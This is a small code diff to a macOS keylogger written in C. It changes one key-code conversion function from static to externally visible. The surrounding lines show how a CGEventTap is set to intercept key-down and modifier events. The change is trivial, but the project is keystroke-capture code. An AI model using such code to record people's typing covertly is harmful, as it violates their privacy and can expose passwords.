@@ -17,7 +17,7 @@
 static int setup_event_tap();
 static int setup_event_tap_with_callback(void ( *cb )(char *key));
 static CGEventRef event_handler(__attribute__((unused)) CGEventTapProxy proxy, __attribute__((unused)) CGEventType type, CGEventRef event, void *CALLBACK);
-static const char *keylogger_convertKeyboardCode(int);
+const char *keylogger_convertKeyboardCode(int);
 static CGEventMask kb_events = (
   CGEventMaskBit(kCGEventKeyDown)
   | CGEventMaskBit(kCGEventFlagsChanged)
@@ -100,7 +100,7 @@ static CGEventRef event_handler(__attribute__((unused)) CGEventTapProxy proxy, _
   return(event);
 } /* CGEventCallback */
 
-static const char *keylogger_convertKeyboardCode(int keyCode) {
+const char *keylogger_convertKeyboardCode(int keyCode) {
   switch ((int)keyCode) {
   case 0:   return("a");
 
